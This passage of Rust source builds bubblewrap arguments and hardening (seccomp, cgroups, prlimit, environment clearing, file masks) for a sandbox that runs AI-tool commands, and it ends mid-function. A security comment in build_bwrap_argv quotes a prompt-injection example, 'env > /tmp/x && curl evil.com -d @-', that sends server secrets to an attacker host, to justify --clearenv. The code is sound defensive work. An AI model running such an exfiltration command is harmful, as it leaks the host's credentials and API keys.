//! bwrap invocation + always-on hardening for the code sandbox.
//!
//! Design rationale and validated flag set for the bwrap + always-on
//! hardening. Every flag here has a test row in the empirical-
//! validation table.

// Linux-only execution primitives — gated so the crate compiles on
// macOS/Windows (where execution goes through the VM / WSL2 backend).
#[cfg(target_os = "linux")]
use std::os::fd::{AsRawFd, IntoRawFd, RawFd};
// tokio::process::Command's `pre_exec` is its own method (unix-gated
// internally); the std::os::unix::process::CommandExt re-export isn't
// needed here.
use std::path::{Path, PathBuf};
#[cfg(target_os = "linux")]
use std::process::Stdio;
#[cfg(target_os = "linux")]
use std::sync::Arc;
#[cfg(target_os = "linux")]
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncReadExt};
#[cfg(target_os = "linux")]
use tokio::process::Command;
#[cfg(target_os = "linux")]
use tokio::time::timeout;
use uuid::Uuid;

use ziee_core::AppError;
use crate::types::{HardeningCapabilities, PidNsMode, SandboxContext};
// Used by the Linux-gated in-host execution path (run_in_sandbox*) and by
// the test module (which compiles on every OS); on macOS/Windows non-test
// builds execution goes through the VM / WSL2 backend and these are unused.
#[cfg(any(target_os = "linux", test))]
use crate::types::{CgroupMode, CodeSandboxState, SeccompMode};

/// Output of a single bwrap invocation. stdout/stderr are each
/// capped at [`OUTPUT_CAP_BYTES`]; bytes past the cap are drained
/// from the pipe and discarded (a truncation marker is appended to
/// the captured output, and `*_truncated: true` is set on the
/// returned JSON). The child is NOT killed when the cap is reached —
/// it can keep running and producing output until natural exit or the
/// wall-clock [`DEFAULT_TIMEOUT_SECS`] expires, at which point a
/// SIGKILL is sent. This keeps a noisy-but-correct workload from
/// being aborted just because it logged a lot, while still bounding
/// total CPU via the timeout.
#[derive(Debug, Clone)]
pub struct SandboxRunResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
    pub duration_ms: u64,
    pub timed_out: bool,
}

/// Per-call output cap. Matches the plan's 1 MiB ceiling. Lifted to
/// a const so tests can assert behavior at the boundary without
/// re-encoding the magic number.
pub const OUTPUT_CAP_BYTES: usize = 1024 * 1024;

/// Default wall-clock timeout for `execute_command`. Other tool callers
/// pass a shorter timeout via `run_in_sandbox`.
pub const DEFAULT_TIMEOUT_SECS: u64 = 600;

/// Run a shell command inside a bwrap-isolated environment.
///
/// All flags are derived from `state.caps` (probed once at boot). The
/// per-call work here is:
///   1. Render argv (no probes; reads cached caps).
///   2. Optionally allocate a transient cgroup scope under
///      `caps.cgroup`'s delegated parent.
///   3. Optionally pipe the compiled seccomp filter bytes to a fd.
///   4. Spawn bwrap → wrap with tokio `timeout` → capture-with-cap.
///   5. Tear down cgroup scope on the way out.
#[cfg(target_os = "linux")]
pub async fn run_in_sandbox(
    state: &CodeSandboxState,
    ctx: &SandboxContext,
    command: &str,
    timeout_secs: Option<u64>,
    flavor: &str,
) -> Result<SandboxRunResult, AppError> {
    run_in_sandbox_with_mounts(state, ctx, command, timeout_secs, flavor, &[], None).await
}

/// `run_in_sandbox` with per-call extra mounts (B4 workflow runner
/// integration). `extra_mounts` is partitioned by mode in
/// `build_bwrap_argv`: `ReadOnly` → `--ro-bind`, `ReadWrite` → `--bind`.
/// Existing security guarantees (`--clearenv`, `--unshare-user`,
/// seccomp gate, cgroup, `--die-with-parent`, output cap, wall-clock
/// timeout) are unchanged. Pass `&[]` for the chat-side path; the
/// workflow runner is the only caller passing non-empty mounts today.
#[cfg(target_os = "linux")]
#[tracing::instrument(
    name = "code_sandbox.exec",
    skip_all,
    fields(
        conversation_id = %ctx.conversation_id,
        user_id = %ctx.user_id,
        command_preview = preview(command, 80),
    ),
)]
pub async fn run_in_sandbox_with_mounts(
    state: &CodeSandboxState,
    ctx: &SandboxContext,
    command: &str,
    timeout_secs: Option<u64>,
    flavor: &str,
    extra_mounts: &[crate::workflow_staging::StagedMount],
    // Live-progress sink (workflow sandbox step only). When `Some`, a host FIFO
    // is created + bound onto `/ziee/progress` in the sandbox; a reader task
    // forwards each newline-trimmed line (one raw progress write) to this
    // sender. `None` (every chat/MCP exec) → no FIFO, no `$ZIEE_PROGRESS`.
    progress_tx: Option<tokio::sync::mpsc::UnboundedSender<Vec<u8>>>,
) -> Result<SandboxRunResult, AppError> {
    use crate::cgroup;

    // Lazy-mount the rootfs for this FLAVOR (squashfuse) + run
    // rootfs-dependent probes (pid_ns, schema). First call per flavor
    // pays ~200-300 ms; subsequent calls for the same flavor return
    // the cached HardeningCapabilities instantly. Per-flavor mounts
    // coexist — minimal and full both stay live once first used.
    let ensure = state.rootfs.ensure_rootfs_ready(flavor).await?;
    let caps = ensure.caps.clone();
    let rootfs_dir = ensure.mount_dir.clone();

    // Hold an inflight guard against the mounted artifact for the
    // duration of this exec session (Plan 5 Phase 3). A pin change
    // mid-exec sees inflight > 0 and waits to evict the mount until
    // this guard drops at function return.
    let _inflight = ensure.artifact_id.and_then(|id| {
        crate::registry::acquire_inflight(
            id,
            crate::registry::InflightKind::Exec,
        )
    });

    // Runtime-configurable resource caps (Plan 1 §6). Async fetch from the
    // singleton; first call after process start loads from DB, every later
    // call hits the in-process RwLock. Snapshot is an Arc so we drop the
    // lock before doing any work.
    let limits =
        crate::resource_limits_cache::get(state.limits.as_ref()).await?;

    let workspace = ctx.workspace.clone();
    // Identity files live OUTSIDE the per-conversation workspace bind
    // (under `<workspace_root>/identity/`) so the sandboxed shell
    // cannot tamper with them via the workspace RW mount.
    let synthetic = SyntheticIdentity::ensure(&state.workspace_root)?;

    // Touch the per-conversation last-used sentinel so the workspace
    // reaper doesn't delete an active long-lived workspace. Without
    // this sentinel, the reaper only sees the directory mtime, which
    // does not update on file writes inside — a 30-day-old
    // conversation that's still in use would get reaped mid-flight.
    let _ = std::fs::write(
        workspace.join(".last_used"),
        chrono::Utc::now().timestamp().to_string(),
    );

    // Per-call cgroup scope, if available.
    let cgroup_scope = match &caps.cgroup {
        CgroupMode::Delegated(parent) => {
            Some(
                cgroup::CgroupScope::create(parent, ctx.conversation_id, &limits)
                    .map_err(|e| {
                        tracing::warn!(
                            "cgroup scope creation failed: {e}; continuing without cgroup"
                        );
                        e
                    })
                    .ok(),
            )
            .flatten()
        }
        CgroupMode::None => None,
    };

    // Per-call seccomp pipe.
    let seccomp_pipe = match &caps.seccomp {
        SeccompMode::Loaded(bpf) => Some(SeccompPipe::install(bpf.clone())?),
        SeccompMode::NotLinked | SeccompMode::Disabled => None,
    };

    // Live-progress FIFO (workflow sandbox step). On the Linux backend bwrap
    // runs directly on the host, so the HOST owns the FIFO: create it, bind it
    // into the sandbox via the argv, and read it host-side, forwarding each
    // line to `progress_tx`. The FIFO lives under the per-conversation
    // workspace's parent (a host-local fs — virtio-fs's mkfifo bug is a
    // VM-only concern). `ProgressFifo` cleans up (unlinks the FIFO + ends the
    // reader) on drop at function return / cancel.
    let progress_fifo = match &progress_tx {
        Some(tx) => match ProgressFifo::spawn(ctx.conversation_id, tx.clone()) {
            Ok(f) => Some(f),
            Err(e) => {
                tracing::warn!("progress FIFO setup failed: {e}; continuing without live progress");
                None
            }
        },
        None => None,
    };

    let argv = build_bwrap_argv(
        &caps,
        &state.workspace_root,
        ctx,
        &rootfs_dir,
        command,
        synthetic.passwd_path(),
        synthetic.group_path(),
        synthetic.mask_path(),
        seccomp_pipe.as_ref().map(|p| p.target_fd()),
        &limits,
        extra_mounts,
        progress_fifo.as_ref().map(|f| f.fifo_path_str()),
    );

    let started = Instant::now();
    let mut cmd = Command::new(&caps.bwrap_path);
    cmd.args(&argv);
    cmd.stdin(Stdio::null());
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.kill_on_drop(true);

    // Attach the seccomp read-fd at the well-known target (we have to
    // dup2 in pre_exec because tokio::process::Command closes non-stdio
    // fds by default).
    if let Some(pipe) = seccomp_pipe.as_ref() {
        let source_fd = pipe.read_fd();
        let target_fd = pipe.target_fd();
        // SAFETY: dup2 is async-signal-safe; we don't allocate or hold
        // locks. The source fd is owned by SeccompPipe and remains
        // valid through cmd.spawn().
        unsafe {
            cmd.pre_exec(move || {
                if libc::dup2(source_fd, target_fd as RawFd) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                // Clear FD_CLOEXEC so the fd survives execve into bwrap.
                let flags = libc::fcntl(target_fd as RawFd, libc::F_GETFD);
                if flags < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                if libc::fcntl(target_fd as RawFd, libc::F_SETFD, flags & !libc::FD_CLOEXEC) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    // NOTE: we deliberately do NOT layer Landlock here. Applying a Landlock
    // ruleset to the bwrap process (it would persist across execve into the
    // workload) is keyed to the *inodes* of the host paths used to build it;
    // bwrap then creates a fresh tmpfs root + `--tmpfs /tmp` + `--dev /dev` +
    // `--proc /proc` whose inodes are under no granted hierarchy, so Landlock
    // would deny the workload's access to /tmp, /dev/null and / and break
    // essentially every command. The only workable Landlock would be an
    // in-rootfs helper applied AFTER bwrap's mounts — but that's a rootfs-
    // release change and is redundant with the mount namespace (the workload
    // already only sees the sandbox mounts; mount/remount syscalls are seccomp-
    // blocked). Filesystem confinement here is bwrap's mount-ns, not Landlock.

    let mut child = cmd
        .spawn()
        .map_err(|e| AppError::new(
            axum::http::StatusCode::INTERNAL_SERVER_ERROR,
            "BWRAP_SPAWN_FAILED",
            format!("failed to spawn bwrap: {e}"),
        ))?;

    // Attach the bwrap pid to the cgroup scope. (L2) This is post-spawn, so in
    // principle there's a window before the workload is in the cgroup — but in
    // practice bwrap's own setup (mount-ns construction, pivot, --proc/--dev)
    // runs before it execs prlimit→bash→workload, and that latency far exceeds
    // this attach, so the workload is in the cgroup before it starts. prlimit
    // (applied to the workload itself, not bwrap) is the always-on backstop
    // regardless. Not worth eliminating with unsafe pre_exec self-attach.
    if let Some(scope) = cgroup_scope.as_ref()
        && let Some(pid) = child.id()
            && let Err(e) = scope.attach_pid(pid) {
                tracing::warn!("cgroup attach_pid({pid}) failed: {e}");
            }

    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");

    let stdout_handle = tokio::spawn(read_capped_owned(stdout));
    let stderr_handle = tokio::spawn(read_capped_owned(stderr));

    // Hard wall-clock timeout. timeout=0 keeps the configured default.
    let budget = Duration::from_secs(
        timeout_secs.unwrap_or(limits.timeout_secs.max(1) as u64),
    );
    let wait_result = timeout(budget, child.wait()).await;

    let (timed_out, status) = match wait_result {
        Ok(Ok(s)) => (false, s.code().unwrap_or(-1)),
        Ok(Err(e)) => {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "BWRAP_WAIT_FAILED",
                format!("wait on bwrap child failed: {e}"),
            ));
        }
        Err(_) => {
            // Timed out → SIGKILL. child.kill() is best-effort; even if
            // the bwrap parent is already dead the kernel will reap.
            let _ = child.start_kill();
            let _ = child.wait().await;
            (true, -1)
        }
    };

    // Drain capture tasks.
    let (stdout_buf, stdout_truncated) = stdout_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));
    let (stderr_buf, stderr_truncated) = stderr_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));

    let duration_ms = started.elapsed().as_millis() as u64;

    // Best-effort cgroup cleanup happens via Drop.
    drop(cgroup_scope);
    drop(seccomp_pipe);
    // Stop the progress reader + unlink the FIFO (no orphaned reader). The
    // bwrap child has exited, so no further writes will arrive; the reader's
    // remaining buffered lines have already been forwarded.
    drop(progress_fifo);

    tracing::info!(
        exit_code = status,
        stdout_bytes = stdout_buf.len(),
        stderr_bytes = stderr_buf.len(),
        timed_out,
        duration_ms,
        "code_sandbox.exec complete",
    );

    Ok(SandboxRunResult {
        exit_code: status,
        stdout: lossy_string_with_marker(stdout_buf, stdout_truncated),
        stderr: lossy_string_with_marker(stderr_buf, stderr_truncated),
        stdout_truncated,
        stderr_truncated,
        duration_ms,
        timed_out,
    })
}

// --------------------------------------------------------------------
// argv construction
// --------------------------------------------------------------------

/// Shared parameters for building the hardening prefix of a bwrap
/// argv. Both the one-shot `build_bwrap_argv` and the long-lived
/// `build_mcp_sandbox_argv` build the SAME prefix (namespaces,
/// rootfs binds, identity, dotfile masks, PID-ns branch, /proc masks,
/// optional seccomp, terminating `--`) and only differ in the tail
/// (one-shot: `prlimit ... -- /bin/bash -lc <cmd>`; MCP: `prlimit ...
/// -- <resolved_cmd> <args...>`).
///
/// `home_bind_source` is the dir bound at `/home/sandboxuser` — for
/// one-shot it's the per-conversation workspace; for MCP it's the
/// per-server workspace (`<sandboxes>/mcp/<server_id>/`).
///
/// `extra_setenv` is layered AFTER the hard-coded HOME/USER/PATH/
/// LANG/LC_ALL/TERM block, so an MCP server's user-supplied env
/// (already filtered through `BLOCKED_ENV_VARS` at the call site)
/// reaches the workload without leaking host env.
///
/// `extra_ro_binds` is appended after the /proc masks (mirroring the
/// position attachment binds occupy in the one-shot path). For
/// one-shot it carries conversation attachments; for MCP it carries
/// the embedded uv/bun extraction dir + its parents.
///
/// `extra_rw_binds` is the workflow runner's per-step artifact mount
/// hook (B4): an additional set of `(host_src, sandbox_dst)` pairs
/// emitted as `--bind` (read-write) — currently used only for
/// `artifacts/<step_id>/` per `kind: sandbox` step so scripts can
/// produce side files for post-collection. Placed AFTER `extra_ro_binds`
/// so a RW bind can't be silently shadowed by an unrelated RO bind at
/// a child path.
///
/// SECURITY: the hardening guarantees (`--clearenv`, `--unshare-user`,
/// seccomp gate, cgroup, `--die-with-parent`) are unaffected by either
/// extra-bind list — they continue to ship before the per-call binds
/// and the `--` terminator.
pub(crate) struct HardeningArgvParams<'a> {
    pub caps: &'a HardeningCapabilities,
    pub rootfs_dir: &'a Path,
    pub passwd_path: &'a Path,
    pub group_path: &'a Path,
    pub mask_path: &'a Path,
    pub home_bind_source: &'a Path,
    pub seccomp_fd: Option<i32>,
    pub extra_setenv: &'a [(String, String)],
    pub extra_ro_binds: &'a [(String, String)],
    pub extra_rw_binds: &'a [(String, String)],
    /// Live-progress FIFO source path (workflow sandbox step only). When
    /// `Some`, the FIFO at this path is `--bind`-bound onto
    /// [`sandbox_vm_protocol::PROGRESS_SANDBOX_PATH`] inside the sandbox and
    /// `$ZIEE_PROGRESS` is set to that path, so step code can
    /// `echo … > "$ZIEE_PROGRESS"`. For the Linux backend this is a host path
    /// (the host creates + reads the FIFO); for the VM backends it's the
    /// guest-local [`sandbox_vm_protocol::PROGRESS_GUEST_FIFO_PATH`] (the agent
    /// creates + reads it). `None` (every chat/MCP exec) → no bind, no setenv.
    pub progress_fifo_src: Option<&'a str>,
}

/// Build the shared hardening prefix: every flag from `--clearenv`
/// through the terminating `--`, ready for the caller to append its
/// tail (prlimit + workload). See `HardeningArgvParams` for the
/// per-call inputs.
pub(crate) fn build_hardening_prefix(p: &HardeningArgvParams) -> Vec<String> {
    let rootfs = p.rootfs_dir.to_str().unwrap_or_default();
    let workspace = p.home_bind_source.to_string_lossy().to_string();

    let mut argv: Vec<String> = vec![
        // SECURITY: see comment block in build_bwrap_argv (the one-shot
        // call site historically owned this comment; preserved there).
        "--clearenv".into(),
        "--unshare-user".into(),
        "--uid".into(),
        "1001".into(),
        "--gid".into(),
        "1001".into(),
        "--unshare-uts".into(),
        "--unshare-ipc".into(),
        "--unshare-cgroup-try".into(),
        "--share-net".into(),
        "--new-session".into(),
        "--die-with-parent".into(),
        "--ro-bind".into(),
        format!("{rootfs}/usr"),
        "/usr".into(),
        "--ro-bind-try".into(),
        "/etc/ssl".into(),
        "/etc/ssl".into(),
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/ssl"),
        "/etc/ssl".into(),
        // /etc/resolv.conf — required for any sandbox child that does
        // DNS (`uvx`, `npx`, `pip install`, `mcp-server-fetch`, …).
        // Prefer the host's resolv.conf (real production nameservers,
        // including any split-DNS setup); fall through to the rootfs's
        // baked-in public-resolver fallback. ro-bind-try silently skips
        // missing sources, so a host or rootfs without /etc/resolv.conf
        // simply means no DNS in the sandbox — no spawn failure.
        "--ro-bind-try".into(),
        "/etc/resolv.conf".into(),
        "/etc/resolv.conf".into(),
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/resolv.conf"),
        "/etc/resolv.conf".into(),
        // /etc/alternatives is Debian's symlink-chain target for system-wide
        // tool choices — e.g. r-base-core resolves libblas.so.3 →
        // /etc/alternatives/libblas.so.3-* → libopenblas via this directory.
        // Without it, packages installed via the alternatives system (R, the
        // BLAS/LAPACK stack, default editor/pager, java/python provider
        // selection) fail at runtime even when the underlying libraries ARE
        // in the rootfs. ro-bind-try so the minimal rootfs (no alternatives)
        // is unaffected.
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/alternatives"),
        "/etc/alternatives".into(),
        // /etc/R holds the R wrapper's ldpaths + Renviron — both sourced by
        // /usr/lib/R/bin/R at startup (the `ldpaths: No such file` error in
        // the reported transcript). Same ro-bind-try policy.
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/R"),
        "/etc/R".into(),
        "--ro-bind".into(),
        p.passwd_path.display().to_string(),
        "/etc/passwd".into(),
        "--ro-bind".into(),
        p.group_path.display().to_string(),
        "/etc/group".into(),
        "--symlink".into(),
        "usr/bin".into(),
        "/bin".into(),
        "--symlink".into(),
        "usr/sbin".into(),
        "/sbin".into(),
        "--symlink".into(),
        "usr/lib".into(),
        "/lib".into(),
        "--symlink".into(),
        "usr/lib64".into(),
        "/lib64".into(),
        "--dev".into(),
        "/dev".into(),
        "--tmpfs".into(),
        "/tmp".into(),
        "--bind".into(),
        workspace,
        "/home/sandboxuser".into(),
        "--chdir".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "HOME".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "USER".into(),
        "sandboxuser".into(),
        "--setenv".into(),
        "PATH".into(),
        // On-demand install layer (feature #3, Part A): user-space package
        // managers install into the per-conversation $HOME (=/home/sandboxuser,
        // the workspace bind), which persists across execute_command calls.
        // Prepend their bin dirs so a tool installed in an earlier call is
        // found in later ones. The dotfile mask hides ~/.bashrc, so a
        // shell-init PATH edit would NOT survive — these --setenv lines are how
        // cross-call persistence is actually wired.
        "/home/sandboxuser/.local/bin:/home/sandboxuser/.ziee/micromamba/bin:/home/sandboxuser/.ziee/npm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
        "--setenv".into(),
        "LANG".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "LC_ALL".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "TERM".into(),
        "dumb".into(),
        // On-demand install layer prefixes (see the PATH comment above). These
        // point micromamba / pip --user / npm at persistent $HOME locations so
        // `pip install`, `micromamba create -p`, `npm i -g` survive across calls
        // within a conversation. Non-secret paths only (--clearenv safe);
        // per-conversation lifetime == the workspace's lifetime.
        "--setenv".into(),
        "MAMBA_ROOT_PREFIX".into(),
        "/home/sandboxuser/.ziee/micromamba".into(),
        "--setenv".into(),
        "PIP_USER".into(),
        "1".into(),
        "--setenv".into(),
        "PYTHONUSERBASE".into(),
        "/home/sandboxuser/.local".into(),
        "--setenv".into(),
        "npm_config_prefix".into(),
        "/home/sandboxuser/.ziee/npm".into(),
        // BLAS/LAPACK auto-detect every host CPU and spawn one thread per CPU
        // at startup. On a 64-core box that's 64 pthread_creates against the
        // sandbox's RLIMIT_NPROC=256, which OpenBLAS regularly loses (the
        // reported transcript hit this once libblas was findable). Single
        // thread is the right default for sandboxed scripted tasks; covers
        // OpenBLAS, BLIS, and Intel MKL with one knob each.
        "--setenv".into(),
        "OPENBLAS_NUM_THREADS".into(),
        "1".into(),
        "--setenv".into(),
        "OMP_NUM_THREADS".into(),
        "1".into(),
        "--setenv".into(),
        "MKL_NUM_THREADS".into(),
        "1".into(),
    ];

    // Caller-supplied env (MCP server config). Filtered upstream
    // against BLOCKED_ENV_VARS so secrets can't be reintroduced
    // through this hook. Empty for the one-shot path → no-op (and
    // therefore byte-identical to the legacy argv).
    for (k, v) in p.extra_setenv {
        argv.push("--setenv".into());
        argv.push(k.clone());
        argv.push(v.clone());
    }

    // Dotfile masks. See the long-form comment at the original call
    // site (one-shot) for rationale + the "regular file vs /dev/null"
    // nuance.
    let mask_src = p.mask_path.display().to_string();
    for dotfile in DANGEROUS_DOTFILES {
        argv.push("--ro-bind".into());
        argv.push(mask_src.clone());
        argv.push(format!("/home/sandboxuser/{dotfile}"));
    }

    // PID namespace + /proc handling per cached mode.
    match p.caps.pid_namespace {
        PidNsMode::Strict => {
            argv.push("--unshare-pid".into());
            argv.push("--as-pid-1".into());
            argv.push("--proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::DevBindFallback => {
            argv.push("--dev-bind".into());
            argv.push("/proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::Disabled => {}
    }

    // /proc-file masks (defense-in-depth in Strict, critical in
    // DevBindFallback).
    for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
        argv.push("--ro-bind".into());
        argv.push("/dev/null".into());
        argv.push(masked.into());
    }

    // Caller-supplied ro-binds (one-shot: per-conversation
    // attachments; MCP: embedded uv/bun bin dir).
    for (host_src, sandbox_dst) in p.extra_ro_binds {
        argv.push("--ro-bind-try".into());
        argv.push(host_src.clone());
        argv.push(sandbox_dst.clone());
    }

    // B4 — workflow runner extra mounts (read-write, e.g. per-step
    // `artifacts/<step_id>/`). `--bind` (not `--bind-try`): the host
    // dir MUST exist — the runner creates it before dispatch — so a
    // missing dir is a programming bug, not a no-op. Placed AFTER the
    // RO binds so an overlapping path resolves RW (the runner never
    // does this today, but the ordering is explicit).
    for (host_src, sandbox_dst) in p.extra_rw_binds {
        argv.push("--bind".into());
        argv.push(host_src.clone());
        argv.push(sandbox_dst.clone());
    }

    // Live-progress FIFO (workflow sandbox step). Bind the (already-created)
    // FIFO onto `/ziee/progress` inside the sandbox and expose its path via
    // `$ZIEE_PROGRESS`. The FIFO is a normal named pipe on a guest-local fs
    // (NOT virtio-fs — libkrun's virtio-fs has an mkfifo EPERM bug), so the
    // bwrap mount namespace can `--bind` it across the boundary and the
    // writer/reader share the same kernel pipe. `--bind` (not `--bind-try`):
    // the FIFO MUST exist — the caller (host) or agent (guest) creates it
    // before this argv runs, so a missing FIFO is a bug, not a no-op.
    if let Some(fifo) = p.progress_fifo_src {
        argv.push("--bind".into());
        argv.push(fifo.to_string());
        argv.push(sandbox_vm_protocol::PROGRESS_SANDBOX_PATH.into());
        argv.push("--setenv".into());
        argv.push("ZIEE_PROGRESS".into());
        argv.push(sandbox_vm_protocol::PROGRESS_SANDBOX_PATH.into());
    }

    // Optional seccomp filter on a well-known fd we'll dup2 to.
    if let Some(fd) = p.seccomp_fd {
        argv.push("--seccomp".into());
        argv.push(fd.to_string());
    }

    // CVE-2024-32462 argument-injection defense: terminator BEFORE the
    // sub-command. Every user-controlled arg after this is data only.
    argv.push("--".into());

    argv
}

/// Build the bwrap argv for a long-lived MCP stdio server. Shares
/// the entire hardening prefix with `build_bwrap_argv`, then appends
/// `prlimit … -- <resolved_cmd> <args>` — NO `/bin/bash -lc` wrapper,
/// because rmcp will exchange JSON-RPC with this process over its
/// own stdin/stdout and a shell layer would corrupt the byte stream.
pub(crate) fn build_mcp_sandbox_argv(
    p: &HardeningArgvParams,
    resolved_cmd: &Path,
    resolved_args: &[String],
    limits: &crate::resource_limits::CodeSandboxResourceLimits,
) -> Vec<String> {
    let mut argv = build_hardening_prefix(p);
    argv.push("/usr/bin/prlimit".into());
    argv.push(format!("--nproc={}", limits.nproc_max));
    argv.push(format!("--as={}", limits.address_space_bytes));
    argv.push(format!("--fsize={}", limits.fsize_bytes));
    argv.push(format!("--nofile={}", limits.nofile_max));
    argv.push("--core=0".into());
    argv.push(format!("--cpu={}", limits.cpu_secs_max));
    argv.push("--".into());
    argv.push(resolved_cmd.display().to_string());
    for a in resolved_args {
        argv.push(a.clone());
    }
    argv
}

/// Exposed at crate level (via `lib.rs`) so the Tier-4 harness can
/// use the EXACT same argv the production code path uses. Without
/// this exposure the test harness had to maintain a parallel argv
/// builder that drifted from production (caught by Tier 6 in commit
/// 5823061 — the `--as-pid-1` gating bug).
pub(crate) fn build_bwrap_argv(
    caps: &HardeningCapabilities,
    // Root under which conversation attachments are staged. The Linux backend
    // passes the host workspace root; the macOS/Windows VM backends pass the
    // *guest* mount (so attachment binds resolve to guest paths) — this is the
    // only thing the argv builder needed from the old `state` param.
    workspace_root: &Path,
    ctx: &SandboxContext,
    rootfs_dir: &Path,
    user_cmd: &str,
    passwd_path: &Path,
    group_path: &Path,
    // Path to an empty regular file used as the bind source for the
    // DANGEROUS_DOTFILES masks. MUST be a normal file (NOT /dev/null) —
    // bwrap's `--ro-bind` inherits `nodev` and bash's `open()` of a char
    // device on a `nodev` mount returns EACCES, breaking `bash -l` when it
    // sources `.bash_profile`. Linux backend passes the synthetic-identity
    // dir's `empty`; macOS/WSL2 backends pass a guest-baked path (provisioned
    // alongside the synthetic passwd/group files).
    mask_path: &Path,
    // Raw fd number bwrap reads the seccomp filter from. Plain `i32` (not
    // `RawFd`) so this argv builder stays OS-independent and shared across
    // backends; only the Linux backend actually wires up the fd.
    seccomp_fd: Option<i32>,
    // Runtime-configurable resource caps (Plan 1 §6). Drives the prlimit
    // literals at the bottom; cgroup-side caps (memory.max / pids.max /
    // cpu.max) are applied by the cgroup module (Linux host) or by the
    // guest agent reading `ExecRequest.cgroup` (macOS / WSL2). The caller
    // resolves this via `resource_limits_cache::snapshot_or_defaults()`.
    limits: &crate::resource_limits::CodeSandboxResourceLimits,
    // B4 — additional per-call mounts requested by the workflow runner.
    // ReadOnly mounts become `--ro-bind`, ReadWrite mounts become
    // `--bind`. Existing callers (all chat-side `execute_command` paths,
    // every tier-4 test) pass `&[]` and behavior is byte-identical to
    // the pre-B4 argv.
    extra_mounts: &[crate::workflow_staging::StagedMount],
    // Live-progress FIFO source path (workflow sandbox step only). `Some(path)`
    // binds that FIFO onto `/ziee/progress` + sets `$ZIEE_PROGRESS`; the Linux
    // backend passes a host FIFO path, the VM backends the guest-local FIFO
    // path the agent creates. `None` (every chat/MCP exec, every tier-4 test)
    // → byte-identical to the pre-progress argv.
    progress_fifo_src: Option<&str>,
) -> Vec<String> {
    // SECURITY (kept here for archaeology — the actual --clearenv flag
    // ships from `build_hardening_prefix`):
    //   wipe the entire inherited environment before any --setenv lines
    //   below. Without --clearenv, the server's full env (DATABASE_URL,
    //   JWT secrets, every *_API_KEY, HUGGINGFACE_API_KEY, AWS_*,
    //   OPENAI_*, ANTHROPIC_*, etc.) would be visible to the sandboxed
    //   bash. Combined with --share-net, a prompt-injection like
    //   `env > /tmp/x && curl evil.com -d @-` would exfiltrate every
    //   secret the server holds. With --clearenv, only the explicit
    //   --setenv values survive into the sandbox.

    // Conversation attachments are read-only-bound into the sandbox.
    // Skip filenames containing path separators or NUL — we already
    // store a basename, but defense-in-depth.
    // Collision-safe mount names: two attachments with the SAME filename would
    // otherwise both bind to `/home/sandboxuser/<name>` and the later one would
    // shadow the earlier. Dedup deterministically (input is ordered by
    // created_at) by suffixing " (2)", " (3)", … before the extension. Stored
    // filenames are never changed — only the in-sandbox mount path.
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let extra_ro_binds: Vec<(String, String)> = ctx
        .files
        .iter()
        .filter(|f| !f.filename.contains('/') && !f.filename.contains('\0'))
        // Skip RO-binding any attachment that has a READ-WRITE workspace copy
        // (editable text files copied in by `stage_editable_files`). The bind
        // would otherwise shadow the editable copy, so in-sandbox edits would
        // silently hit a read-only mount and never version-back.
        .filter(|f| !ctx.workspace.join(&f.filename).is_file())
        .map(|f| {
            let host_path = workspace_attachment_path(workspace_root, f.file_id);
            let dest_name = if seen.insert(f.filename.clone()) {
                f.filename.clone()
            } else {
                let p = std::path::Path::new(&f.filename);
                let stem = p.file_stem().and_then(|s| s.to_str()).unwrap_or(&f.filename);
                let ext = p.extension().and_then(|s| s.to_str());
                let mut chosen = f.filename.clone();
                for i in 2.. {
                    let cand = match ext {
                        Some(e) => format!("{stem} ({i}).{e}"),
                        None => format!("{stem} ({i})"),
                    };
                    if seen.insert(cand.clone()) {
                        chosen = cand;
                        break;
                    }
                }
                chosen
            };
            (
                host_path.display().to_string(),
                format!("/home/sandboxuser/{}", dest_name),
            )
        })
        .collect();

    // Partition workflow runner mounts by mode (B4). Empty for every
    // non-workflow call path → byte-identical argv.
    use crate::workflow_staging::StageMode;
    let extra_workflow_ro: Vec<(String, String)> = extra_mounts
        .iter()
        .filter(|m| m.mode == StageMode::ReadOnly)
        .map(|m| (m.host_path.display().to_string(), m.sandbox_path.clone()))
        .collect();
    let extra_workflow_rw: Vec<(String, String)> = extra_mounts
        .iter()
        .filter(|m| m.mode == StageMode::ReadWrite)
        .map(|m| (m.host_path.display().to_string(), m.sandbox_path.clone()))
        .collect();

    // Concatenate the attachment RO binds with the workflow RO binds so
    // both sets land in the same position in argv.
    let mut all_ro_binds = extra_ro_binds;
    all_ro_binds.extend(extra_workflow_ro);

    // Caller-injected extra RO binds (formerly the inline lit_search `/lit`
    // full-text view bind). Lifted out of this build-DB-free engine function so
    // it carries no `crate::modules::lit_search` reverse-dependency: the ziee
    // HTTP handler computes the per-conversation `/lit` view dir (`is_dir` gate
    // included) and passes it via `ctx.extra_ro_binds`. Appended at the SAME
    // position the inline block occupied — AFTER attachment + workflow RO binds
    // — so the emitted argv is byte-identical for a fixed input. Emitted as
    // `--ro-bind-try` (the extra_ro_binds loop), non-fatal when absent.
    all_ro_binds.extend(ctx.extra_ro_binds.iter().cloned());

